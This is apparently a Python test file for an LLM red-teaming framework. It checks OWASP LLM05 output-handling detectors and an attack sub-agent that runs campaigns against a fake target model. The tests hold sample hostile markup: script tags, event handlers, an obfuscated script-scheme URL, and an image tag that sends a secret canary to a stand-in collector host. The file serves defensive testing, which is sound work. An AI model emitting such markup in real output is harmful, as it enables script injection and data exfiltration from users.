"""Offline tests for the LLM05 sink detectors and sub-agent."""

import json

from judge import Judge
from orchestrator import Orchestrator
from sinks import audit_output
from storage.db import Storage
from subagents.output_handling import OutputHandlingSubAgent
from targets import DEFAULT_CANARIES, DEFAULT_TARGET_SYSTEM, SECRET_CANARY
from tests.fakes import FakeBackend

SAFE = '<div><h2>Paris</h2><p>Sunny, 21 °C</p><span>Wind 5 km/h</span></div>'


def test_inert_html_is_safe():
    assert not audit_output(SAFE).unsafe
    assert not audit_output("Plain text, and a <p>paragraph</p>.").unsafe


def test_detects_active_elements_and_handlers():
    r = audit_output('<div onclick="go()">x</div><script>void 0</script>')
    assert "<script> element" in r.active_html
    assert any("onclick" in f for f in r.active_html)


def test_detects_script_scheme_urls_even_obfuscated():
    r = audit_output('<p><a href=" JaVa script:void(0)">x</a></p>'.replace("JaVa script", "JaVa\tscript"))
    assert any("script URL" in f for f in r.active_html)


def test_external_fetches_and_exfil():
    html = f'<img src="https://collector.example/p.png?k={SECRET_CANARY}"><img src="https://weatherbot.example/i.png">'
    md = "![chart](https://other.example/c.png)"
    r = audit_output(html + md, secret=SECRET_CANARY, allowed_hosts={"weatherbot.example"})
    assert len(r.external_fetches) == 2          # allowlisted host excluded
    assert len(r.exfil_urls) == 1 and r.unsafe


def test_relative_and_allowlisted_are_not_external():
    r = audit_output('<img src="/static/sun.png"><img src="https://weatherbot.example/x.png">',
                     allowed_hosts={"weatherbot.example"})
    assert r.external_fetches == []


def _run(target_reply):
    spec = json.dumps({"payload": "Paris", "context": None, "success_criterion": "own"})
    judge = FakeBackend('{"verdict": "success", "reasoning": "x"}')
    st = Storage(":memory:")
    orch = Orchestrator(FakeBackend(target_reply), DEFAULT_TARGET_SYSTEM,
                        [OutputHandlingSubAgent(FakeBackend(spec))], Judge(judge), st, canaries=DEFAULT_CANARIES)
    [a] = st.get_campaign_attempts(orch.run_campaign("t", "f", "f", 1))
    return a, judge


def test_subagent_success_and_failure_are_deterministic():
    a, judge = _run('<div onmouseover="x()">Paris</div>')
    assert a["owasp_category"] == "LLM05" and a["verdict"] == "success" and judge.calls == []
    assert json.loads(a["extra"])["sink"]["active_html"]
    a, _ = _run(SAFE)
    assert a["verdict"] == "failure" and a["reasoning"].startswith("[sink]")
